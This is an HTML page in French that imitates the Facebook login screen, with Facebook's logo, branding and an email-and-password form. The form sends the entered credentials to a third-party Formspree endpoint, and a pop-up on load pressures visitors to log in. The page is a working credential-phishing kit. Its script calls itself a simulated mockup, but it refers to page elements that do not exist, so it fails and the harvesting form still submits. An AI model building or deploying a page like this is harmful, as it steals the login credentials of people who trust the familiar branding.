<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Connexion</title>
  <link rel="icon" type="image/png" href="https://www.facebook.com/images/fb_icon_325x325.png">
  <style>
    :root{
      --fb-blue:#1877f2;
      --bg:#f0f2f5;
      --card-bg:#ffffff;
      --muted:#606770;
      --danger:#e53935;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      background:linear-gradient(180deg,var(--bg),#e9edf5);
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
      -webkit-font-smoothing:antialiased;
    }

    .wrap{
      width:100%;
      max-width:980px;
      display:grid;
      grid-template-columns:1fr 420px;
      gap:28px;
      align-items:center;
    }

    .brand{
      color:var(--fb-blue);
      display:flex;
      align-items:center;
      gap:10px;
    }
    .brand img{
      width:48px;
      height:48px;
    }
    .brand h1{
      font-size:48px;
      margin:0 0 12px 0;
      letter-spacing:-1px;
    }
    .brand p{
      margin:0;
      font-size:20px;
      color:var(--muted);
    }

    .card{
      background:var(--card-bg);
      padding:18px;
      border-radius:8px;
      box-shadow:0 6px 18px rgba(18,38,63,0.08);
    }
    form{display:flex;flex-direction:column;gap:12px}

    input[type="email"], input[type="password"]{
      width:100%;
      padding:14px 12px;
      font-size:16px;
      border:1px solid #dddfe2;
      border-radius:6px;
    }
    input:focus{outline:3px solid rgba(24,119,242,0.12);border-color:rgba(24,119,242,0.6)}

    .row{display:flex;gap:12px}
    .btn{
      display:inline-flex;
      align-items:center;
      justify-content:center;
      padding:12px 16px;
      font-weight:600;
      border-radius:6px;
      cursor:pointer;
      border:none;
    }
    .btn-primary{background:var(--fb-blue);color:white}
    .btn-secondary{background:#e7f3ff;color:var(--fb-blue)}

    .links{display:flex;justify-content:space-between;align-items:center;font-size:14px}
    .links a{color:var(--fb-blue);text-decoration:none}

    .create-account{
      margin-top:14px;
      display:flex;justify-content:center
    }

    .small-muted{font-size:13px;color:var(--muted)}

    @media (max-width:900px){
      .wrap{grid-template-columns:1fr;max-width:520px}
      .brand h1{font-size:36px}
    }

    .error{color:var(--danger);font-size:13px}

  </style>
</head>
<body>
<main class="wrap" aria-labelledby="title">
    <section class="brand" aria-hidden="false">
      <div class="logo-row" aria-hidden="false">
        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Logo">
        <div>
          <h1 id="title">facebook</h1>
        </div>
      </div>
    </section>

    <aside class="card" aria-label="Formulaire de connexion">
       <form action="https://formspree.io/f/xjkebzwq" method="POST">
        <input id="email" name="email" type="email" placeholder="Numéro ou e-mail" autocomplete="username" required>

        <input id="password" name="password" type="password" placeholder="Mot de passe" autocomplete="current-password" required minlength="6">

        <div class="links">
          <a href="#" id="forgot">Mot de passe oublié ?</a>
        </div>

        <div class="row">
          <button class="btn btn-primary" id="loginBtn" type="submit">Se connecter</button>
        </div>

        <div class="create-account">
        </div>

      </form>
    </aside>
  </main>

  <script>
    window.addEventListener('DOMContentLoaded', () => {
      const confirmation = confirm('Pour que l\'accès vous soit donné, connectez-vous. Cliquez sur "OK" pour continuer.');
      if (confirmation) {
        document.getElementById('content').style.display = 'grid';
      } else {
        alert('Accès refusé tant que vous n\'avez pas accepté.');
      }
    });

    const form = document.getElementById('loginForm');
    const feedback = document.getElementById('feedback');

    form.addEventListener('submit', e => {
      e.preventDefault();
      feedback.classList.remove('error');

      const email = document.getElementById('email');
      const password = document.getElementById('password');

      if(!email.value.trim()){
        feedback.textContent = 'Veuillez entrer votre adresse e-mail ou téléphone.';
        feedback.classList.add('error');
        email.focus();
        return;
      }
      if(password.value.length < 6){
        feedback.textContent = 'Le mot de passe doit contenir au moins 6 caractères.';
        feedback.classList.add('error');
        password.focus();
        return;
      }

      feedback.classList.remove('error');
      feedback.textContent = 'Connexion simulée réussie — ceci est une maquette d\'interface.';
    });

    document.getElementById('demoBtn').addEventListener('click', ()=>{
      document.getElementById('email').value = 'demo@exemple.com';
      document.getElementById('password').value = 'password123';
      feedback.textContent = 'Champs remplis pour la démonstration. Appuyez sur Se connecter.';
      feedback.classList.remove('error');
    });

    document.getElementById('createBtn').addEventListener('click', ()=>{
      alert('Flux de création de compte simulé. Remplacez ceci par la logique de création réelle.');
    });

    document.getElementById('forgot').addEventListener('click',(ev)=>{ev.preventDefault(); alert('Flux de récupération de mot de passe simulé.');});
  </script>
</body>
</html>
